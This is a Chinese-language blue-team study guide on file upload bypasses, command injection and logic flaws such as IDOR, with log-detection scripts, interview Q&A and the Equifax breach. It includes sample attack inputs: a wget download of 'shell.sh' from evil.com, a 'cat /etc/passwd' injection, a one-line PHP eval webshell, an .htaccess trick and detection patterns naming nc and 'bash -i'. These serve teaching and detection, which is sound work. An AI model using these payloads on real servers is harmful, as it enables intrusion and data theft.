## 📖 核心知识讲解

### 一、文件上传漏洞——"让敌人把武器运进你的城堡"

文件上传漏洞是攻击者向Web服务器上传恶意文件（Webshell/木马/病毒）的攻击手段。一旦成功上传可执行脚本（如PHP/JSP/ASPX文件），攻击者就可以远程执行系统命令——"服务器沦陷"。

**攻击链（三步走）**：
1. **上传**：通过各种绕过手法上传恶意文件（Webshell）
2. **访问**：通过HTTP请求访问上传的文件 → 触发脚本执行
3. **执行**：通过Webshell执行系统命令 → 控制服务器

**常见绕过手法**：
| 绕过类型 | 手法 | 示例 | 蓝队检测 |
| --- | --- | --- | --- |
| 扩展名绕过 | 双扩展名 | shell.php.jpg → Apache可能解析为PHP | 检查实际MIME类型 |
| Content-Type绕过 | 修改请求头 | 将PHP的Content-Type改为image/jpeg | 检查文件内容而非头 |
| 文件头绕过 | 添加图片文件头 | GIF89a<?php eval($_POST[x]);?> | 检测文件中的可执行代码 |
| 解析漏洞 | 利用服务器配置 | xxx.php.xxx（IIS）/.htaccess（Apache） | 修复服务器配置 |
| 截断绕过 | %00空字节 | shell.php%00.jpg | 升级服务器/语言版本 |

**蓝队多层次检测方案**：
```bash
# 第1层：WAF检测文件上传请求中的恶意特征
# 第2层：Web日志监控
grep 'POST.*upload' access.log | awk '{print $1, $7, $9}' # 查看文件上传请求

# 第3层：文件系统检测（最近新增的可疑PHP文件）
find /var/www -name '*.php' -mtime -1 -type f

# 第4层：行为检测（Web进程执行异常命令）
grep -iE '(eval\\(|system\\(|exec\\(|shell_exec)' /var/www/uploads/*.php
```

### 二、命令注入——"让服务器执行你的命令"

命令注入（Command Injection）让攻击者在服务器上执行任意系统命令。与SQL注入的不同在于：SQL注入操控的是数据库，命令注入操控的是操作系统Shell。

**注入原理**：
- 后端代码调用了系统命令执行函数：`system("ping -c 3 " . $_GET['ip'])`
- 正常输入：`ip=8.8.8.8` → 执行`ping -c 3 8.8.8.8`
- 攻击输入：`ip=8.8.8.8; cat /etc/passwd` → 执行`ping -c 3 8.8.8.8; cat /etc/passwd`
- 攻击输入：`ip=8.8.8.8 && wget http://evil.com/shell.sh -O /tmp/shell.sh` → 下载后门

**常见注入符号（蓝队检测关键词）**：
- `;` → 命令分隔符（Linux）
- `|` → 管道
- `||` → 前命令失败时执行后命令
- `&&` → 前命令成功时执行后命令
- `（反引号）→ 命令替换
- `$()` → 命令替换（现代写法）
- `%0a` / `%0d` → URL编码的换行/回车（绕过输入过滤）

**检测命令**：
```bash
# 检测命令注入
grep -iP '(;|\|\||&&|\|)(\\s*)(id|whoami|ls|cat|wget|curl|nc |bash|sh|python|perl|ping)' access.log

# 检测换行符绕过
grep -iE '(%0a|%0d|%0d%0a)(id|whoami|cat|ls)' access.log

# 检测反引号/美元符号命令替换
grep -iE '(`[a-z]+`|\\$\([a-z]+)' access.log
```

### 三、逻辑漏洞——"设计缺陷比代码Bug更危险"

逻辑漏洞不是代码层面的错误（如缓冲区溢出/SQL注入），而是**业务流程设计上的缺陷**。正因为不是代码错误，自动化扫描器很难发现，需要人工分析。

**常见逻辑漏洞类型**：

1. **越权访问（IDOR）**：
   - 场景：修改用户ID参数访问他人数据（/order.php?id=100 → 改成id=101看到别人的订单）
   - 根本原因：后端只验证了用户已登录（认证），没有验证该用户是否有权访问该数据（授权）
   - 检测：爬取所有带ID参数的URL→尝试修改ID值→检查是否返回了不该返回的数据

2. **支付逻辑漏洞**：
   - 场景：修改商品价格参数（price=100 → 改成price=1）→以1元购买100元商品
   - 场景：修改数量参数为负数（quantity=-1）→余额反而增加
   - 检测：在BurpSuite中修改请求参数→观察响应和订单金额是否变化

3. **验证码绕过**：
   - 场景：删除验证码参数/置空验证码/使用固定验证码/验证码不过期可重复使用
   - 检测：暴力破解接口时尝试绕过验证码逻辑

4. **条件竞争（Race Condition）**：
   - 场景：同时发起多次请求→利用服务器处理顺序的间隙（如重复领取优惠券、多次提现）
   - 检测：使用BurpSuite Intruder的并发请求模式

**蓝队检测逻辑漏洞的特殊性**：
- 逻辑漏洞没有固定的攻击payload特征→WAF规则匹配基本无效
- 需要从"行为异常"角度检测：用户A的请求中出现了用户B的ID参数→异常
- 依赖业务审计日志：谁在什么时间操作了什么数据→与正常行为基线对比

### 四、文件上传检测实战——从文件到流量到行为

以下是一个完整的文件上传漏洞检测SOP（标准作业程序）：

**阶段1：上传阶段检测（WAF+Web日志）**
```bash
# 检测异常文件上传
grep -iE '(POST.*upload|POST.*file|multipart/form-data)' access.log | awk '{print $1, $7, $9, $10}'

# 检测上传了可执行文件（php/jsp/asp/aspx/jspx/ashx等）
grep -iE '\\.(php[0-9]?|jspx?|asp[x]?|ashx|phtml|pht|shtml)' access.log
```

**阶段2：访问阶段检测**
- 上传文件后被迅速访问→攻击者在验证Webshell是否可用
- 同一IP上传文件后的30秒内访问了同一路径→高度可疑

**阶段3：行为检测（EDR/HIDS）**
- Web进程（www-data/apache/nginx用户）不应该执行系统命令
- 如果Web进程尝试执行netstat/ifconfig/wget/curl等→可能是Webshell在活动
- 使用auditd/Linux审计监控Web目录下的新文件创建事件

**一键检测脚本**：
```bash
#!/bin/bash
echo "=== 最近24小时新增的PHP文件 ==="
find /var/www -name "*.php" -mtime -1 -type f 2>/dev/null
echo ""
echo "=== 包含eval/system/exec的文件 ==="
grep -rlE '(eval\\(|system\\(|exec\\(|shell_exec\\(|passthru\\(|popen\\(|proc_open\()' /var/www/ 2>/dev/null
echo ""
echo "=== 最近的文件上传请求 ==="
grep -iE '(POST.*upload|multipart/form-data)' /var/log/nginx/access.log | tail -20
```

### 五、Web漏洞的体系化认知——输入验证是根本问题

回顾今天学的四种攻击手法（文件上传+命令注入+逻辑漏洞）+ 昨天学的XSS/CSRF/SSRF + 前天的SQL注入，你会发现一个共同根源：

**所有Web漏洞的本质 = 输入验证失败**

- SQL注入：用户输入被当作SQL代码执行 → 没有做参数化查询
- XSS：用户输入被当作HTML/JS代码执行 → 没有做输出编码
- CSRF：用户"身份"被滥用 → 没有验证请求来源
- SSRF：用户输入的URL被服务器访问 → 没有做URL白名单
- 文件上传：用户上传的文件被执行 → 没有做文件类型验证
- 命令注入：用户输入被拼接到系统命令 → 没有做输入过滤
- 逻辑漏洞：业务流程允许非预期操作 → 没有做权限检查

**蓝队的"输入验证思维"**：
看到任何一个用户输入点，脑海中自动弹出三个检查：
1. 这个输入会被用在什么地方？（数据库？HTML？系统命令？URL？文件系统？）
2. 如果攻击者在这里输入恶意内容，最坏能造成什么后果？
3. 当前有没有对应的检测/防御手段？

> 这就是"安全思维"——不是记住100个漏洞类型，而是理解漏洞产生的根本原因，从而在任何场景下都能预判风险。

## 💡 面试高频题

**Q: 文件上传漏洞有哪些绕过手法？如何检测？**

A: 常见绕过：①双扩展名(shell.php.jpg) → 检测文件内容而非扩展名；②Content-Type伪造 → 检测文件头(Magic Bytes)；③图片马 → 检测文件中的可执行代码；④%00截断 → 升级语言/服务器版本；⑤条件竞争 → 部署WAF+行为检测。检测核心：不要只检查文件名和Content-Type，必须检查文件实际内容。

**Q: 命令注入和SQL注入的核心区别是什么？**

A: ①目标不同：命令注入操控操作系统Shell（执行id/whoami/ls等系统命令），SQL注入操控数据库（执行SELECT/INSERT/UPDATE）。②注入符号不同：命令注入用;|&&||`$，SQL注入用'"OR/AND/UNION。③检测位置不同：SQL注入可以从数据库日志中追溯，命令注入只能从系统日志和进程审计中追溯。④防御方式不同：SQL注入用参数化查询防御，命令注入用输入白名单+不使用系统命令执行函数防御。

**Q: 什么是IDOR漏洞？如何检测？**

A: IDOR（Insecure Direct Object Reference）即越权访问，攻击者修改URL中的资源标识符（如ID参数）访问他人的数据。例如/ticket.php?id=100改成id=101看到别人的工单。检测方法：①爬取所有带ID参数的接口；②创建两个不同权限的账户；③用低权限账户尝试访问高权限账户的资源；④如果返回了数据而非403=存在IDOR。这是最常见的逻辑漏洞类型之一。

## 📊 真实案例

**2017年Equifax数据泄露——输入验证失败的惨痛教训**

2017年9月，美国征信巨头Equifax披露了一起大规模数据泄露事件，1.47亿美国消费者的敏感个人信息被窃取。攻击根源是Apache Struts2框架的一个远程代码执行漏洞（CVE-2017-5638）——本质上是一个输入验证失败导致的命令执行漏洞。

Equifax的服务器运行着存在漏洞的Struts2版本，攻击者通过构造恶意的Content-Type头注入系统命令→获取服务器权限→横向移动→窃取数据库。漏洞补丁在事件发生前2个月就已发布，但Equifax没有及时修补。

代价：CEO/CIO/CSO全部引咎辞职，公司市值蒸发数十亿美元，面临多国政府调查和罚款。

教训：①输入验证是Web安全的基石——Equifax的事件根因就是一个Content-Type头的输入验证失败；②漏洞管理不是"知道有漏洞"就够了，必须"在攻击者利用之前修好"；③蓝队需要关注的不只是WAF告警——"正常的"HTTP请求如果利用了框架漏洞，WAF可能完全看不到。

## 文件上传漏洞：攻击者是怎么偷渡 Webshell 的？

### 通俗理解文件上传

一个网站允许你上传头像、上传附件，这本来是很正常的功能。
但如果安全检查不到位，攻击者就可以上传一个披着羊皮的狼——
看起来是图片，实际上是恶意代码文件。

类比：就像机场安检——X 光机可能看到一把枪，但有人把枪拆成零件
藏在行李箱夹层里，安检没看出来。文件上传绕过本质上就是在
欺骗文件类型检测。

### 攻击者绕过的 8 种手法（蓝队必知）
手法 1：改 MIME 类型
欺骗服务器说我是图片——把 Content-Type 从 application/x-php 
改成 image/jpeg。但实际上文件内容还是 PHP 代码。

手法 2：双扩展名
文件名写成 shell.php.jpg——一些配置错误的服务器会把这个文件
当作 PHP 执行。

手法 3：大小写混淆
写成 shell.PhP——黑名单只过滤了 .php，过滤了 .PhP 吗？不一定。

手法 4：特殊后缀
写成 shell.php5 或 shell.phtml——这些后缀在一些服务器上
也会被当作 PHP 执行。

手法 5：图片马
写一段 PHP 代码，塞到真实图片文件的尾部。文件开头是真实的图片数据
（GIF89a...），检测工具看到开头认为是图片就放过了，但后面藏着 PHP 代码。

手法 6：空字节截断
文件名写成 shell.php%00.jpg——当服务器处理 %00（空字节）时，
后面的 .jpg 就被截断了，最终保存的是 shell.php。

手法 7：.htaccess 上传
先上传一个 .htaccess 文件，内容是：
AddType application/x-httpd-php .jpg
这个配置告诉 Apache 把所有 .jpg 文件当 PHP 执行。
然后再上传一个包含 PHP 代码的 .jpg 文件。

手法 8：条件竞争
利用先保存后检查的时间差——文件先存到服务器上，然后才被安全检查。
攻击者在安全检查完成之前（可能只有零点几秒）就访问这个文件，
如果文件已经被执行了，就成功了。

### 蓝队的三层防护
WAF 层（第一道门）：
- 拦截包含 .php / .jsp / .asp 等危险扩展名的文件名
- 检测文件内容中是否包含 <?php <% eval 等代码特征
- 限制上传频率（正常用户不会 1 分钟上传 100 个文件）

应用层（第二道门）：
- 上传的文件重命名为随机 UUID（如 a3f8c2d1.jpg），不保留原始文件名
- 上传目录设置为不可执行（nginx 配置 location /uploads 禁止执行）
- 对上传文件进行病毒扫描

监控层（第三道门）：
- Web 目录下突然出现 .php / .jsp 文件 -> 立即告警
- 监控文件完整性：每天对比文件哈希值，发现变化就告警
- 运行时检测：Web 服务器进程突然执行了 system()/exec() 等函数
  -> 极可能是 Webshell

## 命令注入：攻击者是怎么遥控你的服务器的？

### 通俗理解命令注入

很多网站有这些功能：ping 测试、DNS 查询、文件压缩……
这些功能在底层都是调用系统命令来实现的。如果开发者在拼接系统命令时
没有过滤用户的输入，攻击者就可以注入额外的命令。

类比：你去餐厅点餐，服务员问【要加点什么吗？】
你本应说【加个煎蛋】，但你说【加个煎蛋；然后把收银台里的钱给我】——
如果服务员不检查，就会照做。

### 命令注入的连接符暗语
攻击者用这些符号来拼接自己的命令：

| 符号 | 含义 | 效果 |
|:---|:---|:---|
| ; | 无论成败，继续执行 | cmd1 ; 我的恶意命令 |
| && | 前面的成功才执行后面的 | cmd1 && 我的恶意命令 |
| \|\| | 前面的失败才执行后面的 | cmd1 \|\| 我的恶意命令 |
| \| | 管道——把前面的输出给后面 | cmd1 \| 我的恶意命令 |
| `cmd` | 反引号——先执行里面的命令 | 结果 `whoami` |
| $(cmd) | 命令替换——同上 | 结果$(whoami) |

### 检测命令注入的实战命令
```bash
# 1. 从日志中找命令注入的特征
grep -E ';|&&|\|\||\$\{|`|\$\(|whoami|cat |ls |wget |curl ' access.log

# 2. 找访问系统文件的请求（命令注入尝试读取 /etc/passwd）
grep -i 'passwd\|shadow' access.log

# 3. 找可疑的网络外连（命令注入后反弹 shell / 外带数据）
grep -E 'nc |bash -i|python -c' access.log
```

## 逻辑漏洞：为什么最聪明的攻击往往不用技术？

### 通俗理解逻辑漏洞

逻辑漏洞和 SQL 注入、XSS 这些不一样——它不是代码写错了，
而是逻辑设计有缺陷。打个比方：程序语法是正确的
（就像一篇文章没有错别字），但是文章的逻辑是错的（说太阳从西边出来）。

典型案例：
- 你账户里只有 100 元，但你在支付时修改了金额参数为 -100 元
  -> 余额变成 200 元？
- 把订单号从 1001 改成 1002 -> 看到了别人的订单详情？
- 验证码用过一次还能再用 -> 可以无限尝试密码？
- 跳过支付页面直接访问确认收货页面 -> 0 元购？

### 越权漏洞——最简单粗暴的逻辑漏洞
水平越权（平级之间互相看）：
用户 A 看自己的订单：GET /order/1001
用户 A 改成：GET /order/1002 -> 看到了用户 B 的订单！
就像你输入自己的快递单号，改了个数字就看到了别人的快递信息。

垂直越权（低权限访问高权限功能）：
普通用户访问：GET /admin/user_list -> 居然能打开管理后台！
就像普通员工进了总经理办公室，门居然没锁。

蓝队检测思路：
1. 看同一用户是否在短时间内遍历了大量资源 ID
   （order_id=1,2,3,4,5...）
2. 看普通用户是否访问了管理类接口
   （/admin/ /manage/ /system/）
3. 关注响应数据量异常——普通用户突然拿到了大量数据
   （可能是拖库行为）

## 面试高频问答

Q: 文件上传漏洞的防护，你推荐什么方案？

推荐纵深防御方案，从外到内三道防线：
1. WAF 层：检测文件名和文件内容中的代码特征
2. 应用层：
   - 白名单限制（只允许 jpg/png/pdf）
   - 随机重命名
   - 上传目录禁止执行权限
3. 监控层：
   - Web 目录文件变化监控
   - 运行时 Webshell 行为检测
记住：没有单一方案是万无一失的，必须层层设防。

Q: 命令注入和代码注入有什么区别？

命令注入：注入的是系统命令（如 whoami、cat、curl），
由操作系统的 shell 执行。
代码注入：注入的是编程语言代码（如 PHP 代码、Python 代码），
由应用运行环境执行。
简单说：命令注入 -> 操纵操作系统，代码注入 -> 操纵应用程序。

Q: 为什么逻辑漏洞很难被自动化工具发现？

因为自动化工具（如 SQLMap、AWVS）擅长发现语法错误——
如 SQL 注入的语法特征、XSS 的标签特征。
但逻辑漏洞没有固定的模式——每个业务的逻辑都不一样。
检测逻辑漏洞需要理解业务：知道正常流程是什么，
才能发现异常流程。这也是为什么蓝队需要既懂技术又懂业务。

## 案例分析：文件上传 + 命令注入连环攻击

场景：某公司内网有一个文件共享系统（基于 PHP），
存在文件上传漏洞和一个图片处理功能中的命令注入漏洞。
攻击者利用这两个漏洞完成了完整攻击。

攻击链：
1. 攻击者先通过文件上传漏洞上传了一个 Webshell（图片马，能绕过检测）
2. 访问这个 Webshell：GET /uploads/shell.jpg?cmd=whoami
   -> 看到是 www-data 用户
3. 通过 Webshell 执行命令探测内网：
   netstat -tlnp -> 发现内网有 MySQL(3306) 和 Redis(6379)
4. 利用 Webshell 进一步上传提权工具，找到内核漏洞 -> 提权到 root
5. 添加 SSH 后门，确保持久化访问

蓝队从日志中发现的关键线索：
- /uploads/shell.jpg 的访问日志，但正常用户不会直接访问 uploads 目录的文件
- 该 IP 的请求中出现了大量系统命令关键字（netstat/whoami/ifconfig）
- 短时间内出现了对多个内网 IP 的访问（攻击者在横向移动）
- 凌晨 3-4 点的异常操作（非工作时间 = 可疑）

教训：单个漏洞可能不是致命的，但漏洞组合利用才是蓝队最大的挑战。
文件上传 + Webshell + 命令注入 + 横向移动 = 完整的攻击链路。

## 蓝队实战心得：文件上传/命令注入/逻辑漏洞的排查口诀

### 文件上传排查五步法

```
第一步：查上传目录
  find /var/www -name "*.php" -mtime -7
  找出最近 7 天修改的所有 PHP 文件

第二步：查可疑内容
  grep -rn 'eval\|system\|exec\|base64_decode' /var/www/uploads/
  搜索 Webshell 中最常见的危险函数

第三步：查异常进程
  ps aux | grep www-data
  lsof -p <PID> | grep -E 'LISTEN\|ESTABLISHED'
  检查 Web 进程是否监听了异常端口或建立了异常连接

第四步：查网络连接
  netstat -tlnp | grep -v '80\|443'
  Web 服务器不应该监听除了 80/443 之外的端口

第五步：查日志异常
  grep 'uploads/' /var/log/nginx/access.log | grep -v 'jpg\|png\|css'
  uploads 目录下的 PHP 文件访问记录 = 几乎确定是 Webshell
```

### 命令注入快速检测清单

| 检测项 | 检查命令 | 正常结果 | 异常标志 |
|:---|:---|:---|:---|
| 是否有反弹 Shell | netstat -tlnp | 只有 80/443 | 出现 4444/5555/8888 等端口 |
| 是否有异常进程 | ps aux | www-data 只运行 nginx/php-fpm | 出现 bash/nc/python 进程 |
| 是否有计划任务后门 | crontab -l | 只有正常的定时任务 | 出现 wget/curl 下载脚本的任务 |
| 是否有 SSH 后门 | cat ~/.ssh/authorized_keys | 只有合法管理员的公钥 | 出现陌生公钥 |

### 逻辑漏洞排查经验

逻辑漏洞排查和 SQL 注入/XSS 完全不同——它不是搜关键字就能找到的。排查逻辑漏洞需要带着这些疑问去看系统：

1. 越权检查：把 URL 中的 ID 参数改一下，能访问到别人的数据吗？
2. 流程跳过：能不能不经过步骤 1、2，直接跳到步骤 3？
3. 参数篡改：把金额改成负数、把数量改成 0、把折扣改成 100% 会怎样？
4. 并发测试：同时发 10 个同样的请求，有没有出现超发/超额？
5. 重放测试：用一个旧请求（比如已使用的优惠券）再发一次，能成功吗？
6. 时间窗口：在某个操作的有效期内，能不能做不该做的事？

### 面试中可能的追问

Q: 如果一个系统已经被上传了 Webshell，你怎么在不重启服务的情况下找到它？

A: 分三步：
1. 查文件：grep 搜索包含 eval/system/exec 的 PHP 文件，按修改时间排序
2. 查进程：查看 www-data 用户的进程，关注不正常的父子进程关系
   （如 nginx -> sh -> python 这种链路）
3. 查网络：netstat 看 www-data 是否有向外部未知 IP 的连接

Q: 你如何评估一个逻辑漏洞的危害等级？

A: 从四个维度评估：
1. 影响范围：影响单个用户还是所有用户？
2. 数据敏感度：泄露的是用户名还是密码/手机号/身份证？
3. 资金风险：是否涉及订单金额/账户余额/支付流程？
4. 利用难度：需要什么前提条件？是否需要登录？是否需要特定角色？
